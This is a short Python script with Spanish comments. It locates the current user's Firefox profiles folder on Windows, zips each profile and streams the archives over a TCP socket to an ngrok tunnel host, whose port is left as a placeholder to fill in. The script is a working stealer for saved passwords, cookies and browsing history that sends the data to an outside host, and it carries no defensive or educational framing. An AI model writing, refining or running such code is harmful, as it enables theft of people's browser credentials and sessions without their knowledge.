import socket
import os
import shutil
import concurrent.futures
import getpass

# Obtener el nombre de usuario actual del sistema
username = getpass.getuser()

# Configuraciones del cliente actualizadas con la información de ngrok
server_ip = '6.tcp.ngrok.io'  # Hostname proporcionado por ngrok NOTA REEMPLAZAR ESTO
port = 00000  # Puerto proporcionado por ngrok NOTA REEMPLAZAR ESTO
directory_path = f"C:/Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/"  # Directorio del cual enviar todos los archivos y carpetas
buffer_size = 4096
# Función para obtener el tamaño total de los archivos en un directorio
def get_dir_size(start_path):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(start_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            if os.path.exists(fp):
                total_size += os.path.getsize(fp)
    return total_size

# Función para enviar archivos
def send_file(client_socket, file_path):
    relative_path = os.path.basename(file_path)
    print(f"Enviando {relative_path}")
    try:
        client_socket.sendall(relative_path.encode())
        ack = client_socket.recv(buffer_size)
        print(f"ACK recibido por el nombre del archivo: {ack}")

        with open(file_path, "rb") as file:
            while True:
                bytes_read = file.read(buffer_size)
                if not bytes_read:
                    break
                client_socket.sendall(bytes_read)
        client_socket.sendall(b"EOF")
        ack = client_socket.recv(buffer_size)
        print(f"ACK recibido por el archivo: {ack}")
    except Exception as e:
        print(f"Error al enviar el archivo {relative_path}: {e}")

# Función para comprimir y enviar directorios ordenados por tamaño
def compress_and_send_directories(client_socket, directory_path):
    # Crear una lista de directorios junto con su tamaño total
    directories = [(d, get_dir_size(os.path.join(directory_path, d))) for d in os.listdir(directory_path) if os.path.isdir(os.path.join(directory_path, d))]
    # Ordenar los directorios por tamaño, del más pequeño al más grande
    directories.sort(key=lambda x: x[1])

    # Comprimir y enviar cada directorio
    for dir_name, _ in directories:
        zip_path = os.path.join(directory_path, f"{dir_name}.zip")
        shutil.make_archive(os.path.join(directory_path, dir_name), 'zip', directory_path, dir_name)
        send_file(client_socket, zip_path)
        os.remove(zip_path)  # Elimina el archivo zip después de enviar

# Establecer conexión y enviar archivos
try:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, port))
    compress_and_send_directories(client_socket, directory_path)
    client_socket.sendall(b"END")  # Indica el final de la transmisión
    print("Todos los archivos han sido enviados y el directorio está limpio.")
except Exception as e:
    print(f"Error de conexión: {e}")
finally:
    client_socket.close()
